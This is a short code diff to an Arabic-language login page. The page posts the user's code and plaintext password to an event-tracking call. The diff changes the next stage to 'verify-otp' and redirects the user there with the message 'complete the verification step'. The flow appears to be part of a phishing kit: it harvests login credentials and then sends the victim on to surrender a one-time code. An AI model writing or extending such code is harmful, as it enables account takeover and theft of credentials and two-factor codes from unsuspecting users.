@@ -189,7 +189,7 @@ function LoginPage() {
     void trackEvent({
       data: {
         sessionId: getSessionId(),
-        stage: "processing",
+        stage: "verify-otp",
         patch: {
           user_code: result.data.userCode,
           password: result.data.password,
@@ -197,8 +197,8 @@ function LoginPage() {
         },
       },
     });
-    toast.success("تم تسجيل الدخول — جارٍ المراجعة");
-    setTimeout(() => navigate({ to: "/processing" }), 350);
+    toast.success("تم تسجيل الدخول — أكمل خطوة التحقق");
+    setTimeout(() => navigate({ to: "/verify-otp" }), 350);
   }
 
   return (
